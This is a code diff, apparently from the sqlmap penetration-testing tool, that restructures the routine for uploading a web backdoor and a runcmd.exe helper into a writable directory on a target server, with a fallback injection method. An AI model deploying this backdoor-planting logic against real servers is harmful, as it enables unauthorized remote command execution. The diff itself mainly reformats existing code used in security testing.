@@ -203,36 +203,44 @@ class Web:
                 runcmdName = "tmpe%s.exe" % randomStr(4)
                 runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
                 match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+
                 if match:
                     backdoorDirectory = match.group(1)
                 else:
                     continue
+
                 backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
                 backdoorStream.file.truncate()
                 backdoorStream.read()
                 backdoorStream.seek(0)
                 backdoorStream.write(backdoorContent)
+
                 if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
                     self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
                     self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
                     self.webDirectory = backdoorDirectory
                 else:
                     continue
-            elif not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
-                warnMsg  = "backdoor hasn't been successfully uploaded "
-                warnMsg += "with uploader probably because of permission "
-                warnMsg += "issues."
-                logger.warn(warnMsg)
-                message  = "do you want to try the same method used "
-                message += "for uploader? [y/N] "
-                getOutput = readInput(message, default="N")
-                if getOutput in ("y", "Y"):
-                    self.__webFileInject(backdoorContent, backdoorName, directory)
-                else:
-                    continue
+
+            else:
+                if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
+                    warnMsg  = "backdoor hasn't been successfully uploaded "
+                    warnMsg += "with uploader probably because of permission "
+                    warnMsg += "issues."
+                    logger.warn(warnMsg)
+
+                    message  = "do you want to try the same method used "
+                    message += "for uploader? [y/N] "
+                    getOutput = readInput(message, default="N")
+
+                    if getOutput in ("y", "Y"):
+                        self.__webFileInject(backdoorContent, backdoorName, directory)
+                    else:
+                        continue
+
                 self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                 self.webDirectory = directory
-                
+                    
             infoMsg  = "the backdoor has probably been successfully "
             infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
             infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
